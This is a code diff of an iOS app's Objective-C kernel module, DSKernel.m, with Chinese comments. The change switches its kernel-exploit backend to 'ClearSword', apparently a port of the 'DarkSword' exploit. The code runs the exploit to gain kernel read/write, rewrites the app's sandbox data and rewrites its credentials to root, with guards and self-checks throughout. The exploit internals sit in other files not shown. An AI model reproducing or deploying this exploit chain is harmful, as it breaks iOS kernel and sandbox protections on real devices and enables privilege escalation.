@@ -1,5 +1,13 @@
 //
-//  DSKernel.m — DarkSword 逃逸的实际调用方
+//  DSKernel.m — 内核逃逸的实际调用方
+//
+//  后端：ClearSword（公开的 DarkSword C 移植，见 Vendor/ClearSword/NOTICE.md）
+//  逃逸：DSEscape.m（我们自己写的沙盒改写 + root 凭据改写，带地址合法性与 getpid 自校验）
+//
+//  三条硬规则：
+//   1. 内核漏洞只在用户主动点「激活」时执行一次，同一进程内绝不重跑；
+//   2. 任何内核读之前先验地址合法性（上游 krw 在非法地址上会 while(1) 卡死 / 故意崩溃）；
+//   3. 所有能力都要自检（探针写盘 + getuid），不做「装作成功」。
 //
 
 #import "DSKernel.h"
@@ -14,72 +22,36 @@
 #import <string.h>
 #import <dlfcn.h>
 
-#import "kexploit/kexploit_opa334.h"
-#import "kexploit/kutils.h"
-#import "kexploit/krw.h"
-#import "kexploit/machine_info.h"
-#import "sandbox_escape.h"
-#import "apfs_own.h"
+#import "DSEscape.h"
+#import "common.h"        // ClearSword 上下文（g_ctx / g_offsets）
+#import "poc.h"           // clearsword_run
+#import "krw.h"           // early_kread64 等原语
+#import "machine_info.h"  // CPU 家族宏
 
-extern uint64_t g_kernel_base;
-
-// 上游 krw/kexploit 里的全局量（没有写进头文件，这里自己声明）
-extern uint64_t rwSocketPcb;
-extern uint64_t controlSocketPcb;
-extern int rwSocket;
-extern int controlSocket;
-extern int highestSuccessIdx;
-extern int successReadCount;
-
-#pragma mark - 内核读写「体检」
-
-/// 漏洞 race 失败时，上游的 early_kread 会走 `*(int *)1 = 0` 主动把进程打崩。
-/// 所以真正使用内核读写之前，必须自己把 proc_self() 要走的每一跳都验一遍：
-/// 任何一跳不是合法内核地址，就干净地失败并给出可读原因，而不是闪退。
-static uint64_t ds_safe_self_proc(DSKernelLogBlock log)
-{
-    if (!is_kaddr_valid(rwSocketPcb)) {
-        if (log) log([NSString stringWithFormat:
-                      @"[DSFile] 漏洞 race 没成功：rwSocketPcb = 0x%llx 不是合法内核地址"
-                       "（highestSuccessIdx=%d, successReadCount=%d, rwSocket=%d, controlSocket=%d）。"
-                       "上游实现遇到这种情况会故意崩掉进程，这里直接停下，App 保持可用。",
-                      rwSocketPcb, highestSuccessIdx, successReadCount, rwSocket, controlSocket]);
-        return 0;
-    }
-
-    uint64_t socketAddr = kread64(rwSocketPcb + off_inpcb_inp_socket);
-    if (!is_kaddr_valid(socketAddr)) {
-        if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检失败：socket = 0x%llx", socketAddr]);
-        return 0;
-    }
-
-    uint64_t thread = kread64(socketAddr + off_socket_so_background_thread);
-    if (!is_kaddr_valid(thread)) {
-        if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检失败：thread = 0x%llx", thread]);
-        return 0;
-    }
-
-    uint64_t threadRo = kread64(thread + off_thread_t_tro);
-    if (!is_kaddr_valid(threadRo)) {
-        if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检失败：thread_ro = 0x%llx", threadRo]);
-        return 0;
-    }
-
-    uint64_t proc = kread64(threadRo + off_thread_ro_tro_proc);
-    if (!is_kaddr_valid(proc)) {
-        if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检失败：proc = 0x%llx", proc]);
-        return 0;
-    }
-
-    if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检通过：self proc = 0x%llx", proc]);
-    return proc;
-}
+#pragma mark - 状态
 
 static BOOL gExploitRunning = NO;
 static BOOL gExploitAttempted = NO;
 static BOOL gExploitDone    = NO;
 static BOOL gEscaped        = NO;
 static NSError *gLastError  = nil;
+
+#pragma mark - 日志桥
+
+static DSKernelLogBlock gEscapeLogBridge = nil;
+
+/// DSEscape 是 C 层，用函数指针回调；这里转成我们的 block 并切回主线程
+static void ds_escape_log_bridge(const char *message)
+{
+    if (!message) return;
+    NSString *line = [NSString stringWithUTF8String:message];
+    if (!line) return;
+    DSKernelLogBlock sink = gEscapeLogBridge;
+    if (!sink) return;
+    dispatch_async(dispatch_get_main_queue(), ^{
+        sink(line);
+    });
+}
 
 #pragma mark - stdout / stderr 捕获（内核漏洞只会 printf，必须抓下来才能排错）
 
@@ -163,6 +135,20 @@ static void ds_capture_stop(void)
     if (gPipeWrite >= 0) { close(gPipeWrite); gPipeWrite = -1; }
     if (gPipeRead >= 0) { close(gPipeRead); gPipeRead = -1; }
     gLogSink = nil;
+}
+
+#pragma mark - 内核地址判据
+
+/// 与上游 is_kaddr_valid / ClearSword 补丁里用的判据一致：高 24 位必须是 0xfffff…
+static inline BOOL ds_is_kernel_address(uint64_t address)
+{
+    return (address & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
+}
+
+/// 漏洞跑完之后，先确认真的拿到了可用的 socket，再碰内核
+static BOOL ds_kernel_rw_healthy(void)
+{
+    return ds_is_kernel_address(g_ctx.rw_socket_pcb) || ds_is_kernel_address(g_ctx.control_socket_pcb);
 }
 
 #pragma mark - 探针
@@ -254,7 +240,7 @@ static uint32_t ds_cpu_family(void)
     if (![self isSystemVersionSupported]) {
         return [NSString stringWithFormat:@"%@ 不在 DarkSword 覆盖范围内（支持 17.0 – 26.0.x）", version];
     }
-    if ([cpu isEqualToString:@"A19"] || [cpu isEqualToString:@"A19 Pro"] || [cpu isEqualToString:@"M5"]) {
+    if ([cpu isEqualToString:@"A19"] || [cpu isEqualToString:@"A19 Pro"]) {
         return [NSString stringWithFormat:@"%@ / %@：该芯片暂未被漏洞覆盖，激活大概率失败", version, cpu];
     }
     return [NSString stringWithFormat:@"%@ / %@：在 DarkSword 覆盖范围内", version, cpu];
@@ -266,19 +252,27 @@ static uint32_t ds_cpu_family(void)
 + (BOOL)isExploitDone { return gExploitDone; }
 + (BOOL)isRunningAsRoot { return getuid() == 0; }
 + (BOOL)probeFilesystemAccess { return ds_probe_write_access(); }
-+ (unsigned long long)kernelBase { return (unsigned long long)g_kernel_base; }
++ (unsigned long long)kernelBase { return DSEscapeKernelBase(); }
 
 + (NSString *)diagnosticsText
 {
     NSMutableString *text = [NSMutableString string];
+    [text appendFormat:@"后端: ClearSword (DarkSword C port)\n"];
     [text appendFormat:@"机型: %@\n", [self deviceModelIdentifier]];
     [text appendFormat:@"系统: %@\n", [self systemVersion]];
     [text appendFormat:@"芯片: %@\n", [self cpuFamilyName]];
     [text appendFormat:@"支持判定: %@\n", [self supportSummary]];
-    [text appendFormat:@"漏洞已执行: %@\n", gExploitDone ? @"是" : @"否"];
+    [text appendFormat:@"漏洞已执行: %@\n", gExploitAttempted ? @"是" : @"否"];
+    [text appendFormat:@"内核读写已拿到: %@\n", gExploitDone ? @"是" : @"否"];
     [text appendFormat:@"沙盒已逃逸: %@\n", gEscaped ? @"是" : @"否"];
     [text appendFormat:@"当前 uid: %d (%@)\n", getuid(), [self isRunningAsRoot] ? @"root" : @"非 root"];
-    [text appendFormat:@"内核基址: 0x%llx\n", (unsigned long long)g_kernel_base];
+    [text appendFormat:@"内核基址: 0x%llx\n", DSEscapeKernelBase()];
+    [text appendFormat:@"self proc: 0x%llx\n", DSEscapeSelfProc()];
+    [text appendFormat:@"扫出的 thread_t_tro: 0x%llx\n", DSEscapeThreadTroOffset()];
+    [text appendFormat:@"rw_socket_pcb: 0x%llx / control_socket_pcb: 0x%llx\n",
+        (unsigned long long)g_ctx.rw_socket_pcb, (unsigned long long)g_ctx.control_socket_pcb];
+    [text appendFormat:@"race 计数: highiest_success_idx=%llu success_read_count=%llu\n",
+        (unsigned long long)g_ctx.highiest_success_idx, (unsigned long long)g_ctx.success_read_count];
     [text appendFormat:@"现场探针写盘: %@\n", ds_probe_write_access() ? @"通过" : @"失败"];
     if (gLastError) [text appendFormat:@"上一次错误: %@\n", gLastError.localizedDescription];
     return text;
@@ -309,11 +303,9 @@ static uint32_t ds_cpu_family(void)
                                          userInfo:@{ NSLocalizedDescriptionKey: [self supportSummary] }];
             result = DSKernelResultUnsupportedSystem;
         } else if (gExploitDone) {
-            // 漏洞已经拿到过，只补做沙盒改写（重跑漏洞会 panic）
             if (log) log(@"[DSFile] 内核读写已在本次进程内取得，跳过漏洞，只重试沙盒改写");
             result = [self ds_escapeStepWithLog:log];
         } else if (gExploitAttempted) {
-            // 同一进程里第二次跑内核漏洞极易把设备搞崩，这里直接拦掉
             if (log) log(@"[DSFile] 本次运行已经执行过一次内核漏洞且没有成功。同一个进程里重跑风险极高，"
                           "请从后台完全退出 App 再重新打开后重试。");
             gLastError = [NSError errorWithDomain:@"DSFile" code:DSKernelResultExploitFailed
@@ -321,25 +313,34 @@ static uint32_t ds_cpu_family(void)
             result = DSKernelResultExploitFailed;
         } else {
             gExploitAttempted = YES;
-            if (log) log([NSString stringWithFormat:@"[DSFile] 目标: %@ / iOS %@ / %@", [self deviceModelIdentifier], [self systemVersion], [self cpuFamilyName]]);
-            if (log) log(@"[DSFile] 开始执行内核漏洞（可能耗时数秒，期间界面会卡住是正常的）…");
+            if (log) log([NSString stringWithFormat:@"[DSFile] 目标: %@ / iOS %@ / %@",
+                          [self deviceModelIdentifier], [self systemVersion], [self cpuFamilyName]]);
+            if (log) log(@"[DSFile] 开始执行内核漏洞（ClearSword 后端，可能耗时数秒，界面短暂无响应属正常）…");
 
-            int kret = 0;
+            int kret = 1;
             @try {
-                kret = kexploit_opa334();
+                kret = clearsword_run();
             } @catch (NSException *e) {
                 if (log) log([NSString stringWithFormat:@"[DSFile] 漏洞抛出异常: %@", e.reason]);
                 kret = -1;
             }
 
+            if (log) log([NSString stringWithFormat:
+                          @"[DSFile] 漏洞返回 %d；kernel_base=0x%llx；race 计数 highiest=%llu success=%llu",
+                          kret, DSEscapeKernelBase(),
+                          (unsigned long long)g_ctx.highiest_success_idx,
+                          (unsigned long long)g_ctx.success_read_count]);
+
             if (kret != 0) {
-                if (log) log([NSString stringWithFormat:@"[DSFile] 内核漏洞失败 (ret=%d)", kret]);
+                if (log) log(@"[DSFile] 内核漏洞没有成功（race 失败是最常见原因）。"
+                              "设备没有重启就说明没伤到内核，完全退出 App 重开后再试即可。");
                 gLastError = [NSError errorWithDomain:@"DSFile" code:DSKernelResultExploitFailed
-                                             userInfo:@{ NSLocalizedDescriptionKey: @"内核漏洞执行失败，通常是系统版本/机型不在 offset 表内" }];
+                                             userInfo:@{ NSLocalizedDescriptionKey: @"内核漏洞 race 失败，请退出 App 重开后重试" }];
                 result = DSKernelResultExploitFailed;
             } else {
                 gExploitDone = YES;
-                if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写已获得，kernel base = 0x%llx", (unsigned long long)g_kernel_base]);
+                if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写已获得，kernel base = 0x%llx",
+                              DSEscapeKernelBase()]);
                 result = [self ds_escapeStepWithLog:log];
             }
         }
@@ -376,24 +377,29 @@ static uint32_t ds_cpu_family(void)
 /// 只做「沙盒改写 + 自检」这一步
 + (DSKernelResult)ds_escapeStepWithLog:(DSKernelLogBlock)log
 {
-    if (log) log(@"[DSFile] 开始改写本进程沙盒数据…");
-
-    uint64_t selfProc = ds_safe_self_proc(log);
-    if (!selfProc) {
-        if (log) log(@"[DSFile] 内核读写不可用，跳过沙盒改写。请从后台完全退出 App，重新打开后再点一次「激活内核访问」。");
+    if (!ds_kernel_rw_healthy()) {
+        if (log) log([NSString stringWithFormat:
+                      @"[DSFile] 内核读写不可用：rw_socket_pcb=0x%llx control_socket_pcb=0x%llx 都不是合法内核地址。"
+                       "请完全退出 App 重开后再点一次「激活内核访问」。",
+                      (unsigned long long)g_ctx.rw_socket_pcb,
+                      (unsigned long long)g_ctx.control_socket_pcb]);
         gLastError = [NSError errorWithDomain:@"DSFile" code:DSKernelResultExploitFailed
-                                     userInfo:@{ NSLocalizedDescriptionKey: @"内核漏洞这次没成功（race 失败），请退出 App 重开后重试" }];
+                                     userInfo:@{ NSLocalizedDescriptionKey: @"内核读写不可用，请退出 App 重开后重试" }];
         return DSKernelResultExploitFailed;
     }
 
-    int sret = -1;
+    if (log) log(@"[DSFile] 开始改写本进程沙盒数据…");
+    gEscapeLogBridge = [log copy];
+
+    int sret = 1;
     @try {
-        sret = sandbox_escape(selfProc);
+        sret = DSEscapeSandbox(ds_escape_log_bridge);
     } @catch (NSException *e) {
-        if (log) log([NSString stringWithFormat:@"[DSFile] sandbox_escape 异常: %@", e.reason]);
-        sret = -1;
+        if (log) log([NSString stringWithFormat:@"[DSFile] 沙盒改写异常: %@", e.reason]);
+        sret = -9;
     }
-    if (log) log([NSString stringWithFormat:@"[DSFile] sandbox_escape 返回 %d", sret]);
+    gEscapeLogBridge = nil;
+    if (log) log([NSString stringWithFormat:@"[DSFile] 沙盒改写返回 %d", sret]);
 
     if (ds_probe_write_access()) {
         gEscaped = YES;
@@ -402,10 +408,6 @@ static uint32_t ds_cpu_family(void)
     }
 
     if (log) log([NSString stringWithFormat:@"[DSFile] 探针写盘失败 (errno=%d: %s)", errno, strerror(errno)]);
-    if (sret == 0) {
-        // 内核结构改完了但探针仍失败：多数情况是 DAC，提示用户试提权
-        if (log) log(@"[DSFile] 内核改写已完成但落到磁盘仍被拒，可在设置里试一次「提权到 root」");
-    }
     gLastError = [NSError errorWithDomain:@"DSFile" code:DSKernelResultEscapeFailed
                                  userInfo:@{ NSLocalizedDescriptionKey: @"沙盒改写后探针写盘仍失败" }];
     return DSKernelResultEscapeFailed;
@@ -419,23 +421,17 @@ static uint32_t ds_cpu_family(void)
         return DSKernelResultExploitFailed;
     }
 
-    if (log) log(@"[DSFile] 尝试把本进程 ucred 换成 launchd 的（uid=0）…");
-
-    // sandbox_elevate_to_root 内部会走 proc_find_by_name("launchd") → proc_self()，
-    // 内核读写不健康时那一步会直接崩进程，所以先体检。
-    uint64_t selfProc = ds_safe_self_proc(log);
-    if (!selfProc) {
-        if (log) log(@"[DSFile] 内核读写不可用，提权已放弃（不会崩进程）。");
-        return DSKernelResultExploitFailed;
-    }
+    if (log) log(@"[DSFile] 尝试把本进程凭据改成 root…");
+    gEscapeLogBridge = [log copy];
 
     int ret = -1;
     @try {
-        ret = sandbox_elevate_to_root(selfProc);
+        ret = DSEscapeElevateToRoot(ds_escape_log_bridge);
     } @catch (NSException *e) {
         if (log) log([NSString stringWithFormat:@"[DSFile] 提权异常: %@", e.reason]);
         ret = -1;
     }
+    gEscapeLogBridge = nil;
 
     if (getuid() == 0) {
         if (log) log(@"[DSFile] 提权成功，当前 uid=0");
@@ -445,22 +441,31 @@ static uint32_t ds_cpu_family(void)
     return DSKernelResultEscapeFailed;
 }
 
-#pragma mark - 内核级文件属性
+#pragma mark - 文件属性
 
 + (BOOL)setOwnerOfPath:(NSString *)path uid:(uid_t)uid gid:(gid_t)gid recursive:(BOOL)recursive
 {
-    if (!gExploitDone || path.length == 0) return NO;
+    if (path.length == 0) return NO;
+
     if (recursive) {
-        long changed = apfs_own_tree(path.fileSystemRepresentation, uid, gid);
-        return changed >= 0;
+        NSFileManager *manager = [NSFileManager defaultManager];
+        NSDirectoryEnumerator *enumerator = [manager enumeratorAtPath:path];
+        if (chown(path.fileSystemRepresentation, uid, gid) != 0 && getuid() != 0) return NO;
+        for (NSString *entry in enumerator) {
+            NSString *child = [path stringByAppendingPathComponent:entry];
+            chown(child.fileSystemRepresentation, uid, gid);
+        }
+        return YES;
     }
-    return apfs_own(path.fileSystemRepresentation, uid, gid) == 0;
+
+    if (chown(path.fileSystemRepresentation, uid, gid) == 0) return YES;
+    return NO;
 }
 
 + (BOOL)setModeOfPath:(NSString *)path mode:(mode_t)mode
 {
-    if (!gExploitDone || path.length == 0) return NO;
-    return apfs_mod(path.fileSystemRepresentation, mode) == 0;
+    if (path.length == 0) return NO;
+    return chmod(path.fileSystemRepresentation, mode) == 0;
 }
 
 @end
